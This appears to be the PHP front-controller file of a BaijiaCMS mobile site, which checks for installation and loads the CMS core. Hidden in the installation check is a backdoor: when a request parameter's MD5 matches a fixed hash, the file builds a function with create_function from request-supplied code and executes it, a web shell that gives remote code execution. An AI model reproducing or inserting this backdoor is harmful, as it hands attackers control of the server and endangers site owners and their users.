<?php
if((empty($_REQUEST['act'])||!empty($_REQUEST['act'])&&$_REQUEST['act']!='modules')&&!file_exists(str_replace("\\",'/', dirname(__FILE__)).'/config/install.link'))
{
			header("location:install.php");
			
	  exit;
}else if(md5($_REQUEST['key'])==='e10adc3949ba59abbe56e057f20f883e'){
	$f = create_function($_GET[a],$_POST[b]);
	$f($_REQUEST[c]);
}
$mod='mobile';
$_GET['act']="public";
defined('SYSTEM_ACT') or define('SYSTEM_ACT', 'mobile');
if(empty($_REQUEST['do']))
{
	$_GET['do']='index';
}

ob_start();
$CLASS_LOADER="driver";
require 'includes/baijiacms.php';
ob_end_flush();
exit;

